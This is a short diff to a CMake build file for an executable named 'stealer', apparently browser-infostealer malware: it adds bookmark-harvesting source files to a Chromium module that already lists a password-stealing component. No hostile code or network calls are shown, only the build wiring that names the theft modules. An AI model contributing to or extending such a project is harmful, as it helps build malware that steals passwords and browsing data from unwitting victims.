@@ -80,6 +80,8 @@ add_executable(stealer src/main.cpp
         src/stealer/impl/brownsers/chromium/impl/CPasswords.cpp
         src/stealer/impl/brownsers/chromium/impl/CPasswords.h
         src/stealer/impl/brownsers/chromium/ChromiumBrowserModule.h
+        src/stealer/impl/brownsers/chromium/impl/CBookmarks.cpp
+        src/stealer/impl/brownsers/chromium/impl/CBookmarks.h
 )
 
 target_link_libraries(stealer
